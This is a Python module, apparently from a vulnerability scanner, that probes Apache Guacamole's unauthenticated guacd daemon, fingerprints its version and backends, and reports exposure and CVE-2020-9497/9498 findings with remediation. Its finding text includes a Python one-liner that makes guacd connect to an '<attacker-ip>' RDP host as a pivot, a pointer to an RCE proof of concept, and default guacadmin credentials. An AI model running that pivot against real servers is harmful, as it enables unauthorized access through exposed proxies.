"""Apache Guacamole proxy daemon (guacd, 4822/tcp) protocol probe.

guacd speaks a text-framed opcode protocol: `LENGTH.VALUE,LENGTH.VALUE,...;`
where LENGTH is the CHARACTER count of VALUE. The web tier is expected to
authenticate the user, then open a loopback session to guacd and drive it
with `select,<proto>` to bind a backend (RDP/VNC/SSH/telnet/kubernetes).

guacd itself has NO authentication — it trusts its caller. A reachable
non-loopback 4822 lets any attacker send `6.select,3.rdp;` and use guacd
as an outbound RDP/VNC/SSH proxy into arbitrary hostnames guacd can route,
and pre-1.2.0 builds carry CVE-2020-9497 (info disclosure) and
CVE-2020-9498 (heap UAF → RCE) reachable pre-auth over exactly this port.

Findings:
  * guacd_exposed (CRITICAL) — reachable off loopback; no-auth pivot into
    RDP/VNC/SSH targets via `select`.
  * guacd_cve_2020_9498 (HIGH) — parsed version < 1.2.0; pre-auth RCE.
  * guacd_cve_2020_9497 (MEDIUM) — parsed version < 1.2.0; pre-auth memory
    disclosure via crafted static-virtual-channel packet.
  * guacd_fingerprint (info) — always emitted with version + accepted backends.

Wire example (probe):
  CLIENT  6.select,3.vnc;
  SERVER  4.args,13.VERSION_1_5_0,8.hostname,4.port,...;

Airgap-safe: stdlib socket only. One TCP roundtrip per opcode, 4s timeout
scaled by proxy.scaled().
"""
from __future__ import annotations

import re
import socket

from ..core import proxy
from ..core.models import Host, Port


_DEFAULT_PORT = 4822
_TIMEOUT = 4.0
_MAX_FRAME_BYTES = 65_536

_BACKENDS = ("rdp", "vnc", "ssh", "telnet", "kubernetes",
             "sftp", "mysql", "postgresql")

_VERSION_RE = re.compile(r"VERSION_(\d+)_(\d+)_(\d+)")


def is_guacd(port: Port) -> bool:
    svc = (port.service or "").lower()
    prod = (port.product or "").lower()
    return (port.portid == 4822
            or "guacd" in svc or "guacamole" in svc
            or "guacamole" in prod)


def encode(*elements: str) -> bytes:
    """Encode one guacd instruction. LENGTH is the CHARACTER count of VALUE."""
    return (",".join(f"{len(e)}.{e}" for e in elements) + ";").encode("utf-8")


def decode_one(text: str) -> tuple[list[str], str]:
    """Decode a single `LENGTH.VALUE,...;` instruction from `text`.

    Returns (elements, remainder). Raises ValueError on a malformed frame.
    LENGTH is the CHARACTER count, matched against `text` slice by slice."""
    elements: list[str] = []
    i = 0
    n = len(text)
    while True:
        j = text.find(".", i)
        if j < 0:
            raise ValueError("missing '.' after length")
        length_s = text[i:j]
        if not length_s.isdigit():
            raise ValueError("non-digit length")
        length = int(length_s)
        start = j + 1
        end = start + length
        if end > n:
            raise ValueError("length exceeds buffer")
        elements.append(text[start:end])
        if end >= n:
            raise ValueError("unterminated instruction")
        sep = text[end]
        if sep == ",":
            i = end + 1
            continue
        if sep == ";":
            return elements, text[end + 1:]
        raise ValueError(f"bad separator {sep!r}")


def _read_frame(sock: socket.socket, timeout: float) -> str:
    """Read bytes until a ';' is seen (or the cap / EOF). Returns decoded
    text (latin-1 to survive stray bytes); empty on EOF or timeout."""
    sock.settimeout(timeout)
    buf = bytearray()
    try:
        while len(buf) < _MAX_FRAME_BYTES:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf.extend(chunk)
            if b";" in chunk:
                break
    except (socket.timeout, OSError):
        return ""
    return buf.decode("latin-1", "replace")


def _extract_version(elements: list[str]) -> str:
    """Return '1.5.0' from a VERSION_x_y_z token anywhere in an args frame."""
    for e in elements:
        m = _VERSION_RE.search(e)
        if m:
            return f"{m.group(1)}.{m.group(2)}.{m.group(3)}"
    return ""


def _version_tuple(v: str) -> tuple[int, ...] | None:
    """Parse '1.5.0' → (1,5,0). Returns None on anything unparseable so a
    malformed VERSION token can NEVER trip a version-gated CVE finding."""
    if not v:
        return None
    parts = v.split(".")
    if not parts:
        return None
    try:
        return tuple(int(p) for p in parts)
    except ValueError:
        return None


def _version_lt(v: str, ref: tuple[int, ...]) -> bool:
    """Strict less-than compare, guarded so an unparseable version returns
    False (never fires a CVE finding without a verified version)."""
    t = _version_tuple(v)
    if t is None:
        return False
    return t < ref


def _one_select(ip: str, port: int, backend: str,
                timeout: float) -> tuple[str, list[str]]:
    """Open a fresh connection, send `select,<backend>`, read one frame,
    return (opcode, elements). ('', []) on any transport-level failure."""
    try:
        with socket.create_connection((ip, port),
                                       timeout=proxy.scaled(timeout)) as s:
            s.sendall(encode("select", backend))
            frame = _read_frame(s, proxy.scaled(timeout))
    except OSError:
        return "", []
    if not frame:
        return "", []
    try:
        elements, _rest = decode_one(frame)
    except ValueError:
        return "", []
    if not elements:
        return "", []
    return elements[0], elements[1:]


# T2 promotion — capture the ACTUAL wire args frame guacd returns for
# `select,rdp`. Single controlled read: one fresh TCP connect, one opcode,
# one frame, bounded timeout via proxy.scaled. Non-destructive — guacd's
# args reply is a template of the parameters it will accept, not a state
# change. The raw text (LENGTH.VALUE,...;) is real server-side evidence:
# it includes the VERSION_x_y_z token and the exact parameter list the
# server-side plugin advertises, which is what an SSRF-pivot exploit is
# built against. Cap the captured bytes to _MAX_LEAK_BYTES so a
# pathological reply cannot bloat the finding.
_MAX_LEAK_BYTES = 4096
_LEAK_BACKEND = "rdp"


def verify_handshake_leak(ip: str, port: int = _DEFAULT_PORT,
                          timeout: float = _TIMEOUT,
                          backend: str = _LEAK_BACKEND) -> str:
    """Single-shot T2 verify: send `select,<backend>` and return the raw
    wire text of the first args frame back (truncated to _MAX_LEAK_BYTES).
    Returns '' on any transport failure, non-args opcode, or malformed
    frame — an empty string means the promotion does not fire and the
    finding stays at t1."""
    try:
        with socket.create_connection((ip, port),
                                       timeout=proxy.scaled(timeout)) as s:
            s.sendall(encode("select", backend))
            frame = _read_frame(s, proxy.scaled(timeout))
    except OSError:
        return ""
    if not frame:
        return ""
    try:
        elements, _rest = decode_one(frame)
    except ValueError:
        return ""
    if not elements or elements[0] != "args":
        return ""
    end = frame.find(";")
    raw = frame[:end + 1] if end >= 0 else frame
    if len(raw) > _MAX_LEAK_BYTES:
        raw = raw[:_MAX_LEAK_BYTES]
    return raw


def probe(ip: str, port: int = _DEFAULT_PORT,
          timeout: float = _TIMEOUT,
          backends: tuple[str, ...] = _BACKENDS) -> dict:
    """Handshake with guacd, extract version + accepted-backend list.

    Sends `select,vnc` first — that's the canonical, always-present backend
    in a stock build, so a reply proves guacd is speaking. Then walks the
    `backends` list, one fresh connect per opcode, recording which the
    daemon supports (opcode `args`) vs refuses (`error` or immediate close).

    Returns:
      {reachable, version, opcode, args_seen[], backends_ok[],
       backends_err[], error}
    """
    out: dict = {"reachable": False, "version": "", "opcode": "",
                 "args_seen": [], "backends_ok": [], "backends_err": [],
                 "error": ""}
    op, elements = _one_select(ip, port, "vnc", timeout)
    if not op:
        out["error"] = "no response to select,vnc"
        return out
    out["reachable"] = True
    out["opcode"] = op
    if op == "args":
        out["version"] = _extract_version(elements)
        out["args_seen"] = elements
        out["backends_ok"].append("vnc")
    else:
        out["backends_err"].append("vnc")
    for b in backends:
        if b == "vnc":
            continue
        b_op, _b_elems = _one_select(ip, port, b, timeout)
        if b_op == "args":
            out["backends_ok"].append(b)
        else:
            out["backends_err"].append(b)
    return out


def guacd_targets(hosts: list[Host]) -> list[dict]:
    out = []
    for h in hosts:
        for p in h.open_ports:
            if is_guacd(p):
                out.append({"ip": h.ip, "port": p.portid,
                            "version": f"{p.product} {p.version}".strip()})
    return out


def _finding(sev, title, target, detail, cmd, rem, cwes, kind="",
             exploit_note="", depth_tier="", output=""):
    f = {"severity": sev, "title": title, "target": target, "detail": detail,
         "tool": "nc", "command": cmd, "remediation": rem,
         "cwes": cwes, "kind": kind,
         "exploit_note": exploit_note, "depth_tier": depth_tier}
    if output:
        f["output"] = output
    return f


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    probes = probes or {}
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if not is_guacd(p):
                continue
            pr = probes.get((h.ip, p.portid))
            if not pr or not pr.get("reachable"):
                continue
            tgt = f"{h.ip}:{p.portid}"
            version = pr.get("version") or ""
            backends_ok = pr.get("backends_ok") or []
            backends_txt = ", ".join(backends_ok) if backends_ok else "none confirmed"
            # guacd_exposed — CRITICAL. Any reachable off-loopback guacd is
            # a pre-auth SSRF/pivot: `select,rdp` + attacker-controlled
            # hostname argument reaches anywhere guacd can route.
            # T2 promotion: if the single-shot `select,rdp` verify captured
            # the actual args frame guacd volunteered, upgrade depth_tier
            # to t2 and surface the raw wire text as corroborating server-
            # side evidence (the RDP plugin's live parameter template plus
            # its VERSION token — proves the SSRF vector is armed, not just
            # that the port speaks the protocol).
            handshake_leak = pr.get("handshake_leak") or ""
            exposed_tier = "t2" if handshake_leak else "t1"
            leak_note = ""
            if handshake_leak:
                leak_note = (
                    f" T2 verify captured the live `select,rdp` args frame "
                    f"({len(handshake_leak)} bytes) — the RDP plugin's "
                    f"parameter template that an SSRF pivot would be built "
                    f"against is armed and returned by the server.")
            out.append(_finding(
                "critical",
                "guacd reachable off-loopback (no authentication, arbitrary pivot)",
                tgt,
                f"Apache Guacamole proxy daemon answered `select,vnc` with "
                f"opcode `{pr.get('opcode','?')}`. guacd has NO authentication "
                f"of its own — the web tier is expected to authenticate the "
                f"user and then connect guacd on 127.0.0.1. A reachable "
                f"4822/tcp lets an attacker send `select,rdp` (or ssh/vnc/"
                f"telnet/kubernetes) with any hostname argument and use "
                f"guacd as an outbound proxy into whatever guacd can route. "
                f"Backends confirmed built-in: {backends_txt}. "
                f"Version: {version or 'unknown'}." + leak_note,
                f"printf '6.select,3.vnc;' | nc {h.ip} {p.portid}",
                "Bind guacd to 127.0.0.1 in /etc/guacamole/guacd.conf "
                "([server] bind_host = 127.0.0.1). If the web tier lives on "
                "another host, put guacd behind a firewall / private "
                "management network and require mutual TLS on the guacd "
                "listener (guacd-ssl.crt + guacd-ssl.key).",
                ["CWE-306", "CWE-918"], kind="guacd_exposed",
                exploit_note=(
                    "python3 -c 'import socket;s=socket.create_connection("
                    "(\"<ip>\",<port>));s.sendall(b\"6.select,3.rdp;\");"
                    "print(s.recv(4096));s.sendall(b\"4.size,4.1024,3.768,"
                    "2.96;5.audio,0;5.video,0;5.image,0;8.timezone,0;"
                    "8.hostname,15.<attacker-ip>,4.port,4.3389,7.security,"
                    "3.any;\");print(s.recv(4096))'   # watch tcpdump -ni "
                    "any port 3389 on the attacker"),
                depth_tier=exposed_tier, output=handshake_leak))
            # Version-gated CVEs. Never emit without a parsed version.
            if _version_lt(version, (1, 2, 0)):
                out.append(_finding(
                    "high",
                    "Apache Guacamole guacd < 1.2.0 pre-auth RCE (CVE-2020-9498)",
                    tgt,
                    f"guacd reports VERSION {version}. Versions before 1.2.0 "
                    f"contain a heap use-after-free in the RDP client's SVC "
                    f"receive path (guac_common_svc_process_receive) that is "
                    f"reachable pre-auth via 4822/tcp and yields code "
                    f"execution as the guacd user. Chained with the exposed "
                    f"listener above, this is a pre-auth RCE with no "
                    f"credential requirement.",
                    f"printf '6.select,3.rdp;' | nc {h.ip} {p.portid}   "
                    f"# then a crafted RDP session — see CVE-2020-9498 PoC",
                    "Upgrade Apache Guacamole to 1.2.0 or later (fix "
                    "released June 2020). If an in-place upgrade is not "
                    "possible, disable the RDP protocol plugin on guacd "
                    "(remove libguac-client-rdp.so) and restrict 4822 to "
                    "loopback.",
                    ["CWE-416"], kind="guacd_cve_2020_9498",
                    exploit_note=(
                        "See Check Point 2020-07-02 write-up 'Reverse RDP - "
                        "The Path Not Taken'; PoC at "
                        "github.com/checkpoint-research/CVE-2020-9498. "
                        "Lab-only - it heap-corrupts guacd."),
                    depth_tier="t0"))
                out.append(_finding(
                    "medium",
                    "Apache Guacamole guacd < 1.2.0 memory disclosure "
                    "(CVE-2020-9497)",
                    tgt,
                    f"guacd reports VERSION {version}. Versions before 1.2.0 "
                    f"leak uninitialised process memory through a crafted "
                    f"static virtual channel packet — useful for extracting "
                    f"session tokens and material from adjacent connections.",
                    f"printf '6.select,3.rdp;' | nc {h.ip} {p.portid}",
                    "Upgrade Apache Guacamole to 1.2.0 or later.",
                    ["CWE-908", "CWE-200"], kind="guacd_cve_2020_9497"))
            # Always emit an info fingerprint so guacd presence is on the sheet.
            out.append(_finding(
                "info", "guacd fingerprint", tgt,
                f"Apache Guacamole proxy daemon · version "
                f"{version or 'unknown'} · backends supported: "
                f"{backends_txt}",
                f"printf '6.select,3.vnc;' | nc {h.ip} {p.portid}",
                "Restrict guacd to loopback; expose only the /guacamole/ "
                "web tier behind auth.",
                [], kind="guacd_fingerprint"))
    return out


def runbook(ip: str, port: int) -> list[dict]:
    return [
        {"step": "Handshake — expect an `args` frame back",
         "cmd": f"printf '6.select,3.vnc;' | nc {ip} {port}"},
        {"step": "Enumerate a backend (rdp/ssh/telnet/kubernetes)",
         "cmd": f"printf '6.select,3.rdp;' | nc {ip} {port}"},
        {"step": "Look for the co-located web tier (default creds "
                 "guacadmin:guacadmin)",
         "cmd": f"curl -sk https://{ip}:8443/guacamole/   "
                f"# or http://{ip}:8080/guacamole/"},
    ]


def findings_to_vulns(fs: list[dict]) -> dict:
    from .svccommon import findings_to_vulns as _f2v
    return _f2v(fs, "guacamole", _DEFAULT_PORT)


def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
            budget: float | None = None, progress=None) -> dict:
    from . import svcprobe
    targets = guacd_targets(hosts)
    probes: dict = {}
    state: dict = {}
    if active:
        for t, pr in svcprobe.iter_probe(
                targets, lambda t: probe(t["ip"], t["port"]),
                budget=budget, progress=progress, state=state):
            if pr:
                probes[(t["ip"], t["port"])] = pr
                t["reachable"] = pr.get("reachable", False)
                t["version"] = pr.get("version", "")
                t["backends"] = len(pr.get("backends_ok", []))
                # T2 verify — one extra controlled read per reachable guacd
                # to capture the live `select,rdp` args frame as server-
                # side evidence. Skipped when the daemon spoke but did not
                # return an args frame at all (opcode='error'), since the
                # RDP plugin either isn't loaded or refused.
                if pr.get("reachable") and pr.get("opcode") == "args":
                    leak = verify_handshake_leak(t["ip"], t["port"])
                    if leak:
                        pr["handshake_leak"] = leak
    fs = findings(hosts, probes)
    runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                 "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
                for t in targets]
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "probes": {f"{k[0]}:{k[1]}": v for k, v in probes.items()},
            "stats": {"targets": len(targets), "findings": len(fs),
                      "stopped": state.get("stopped")}}
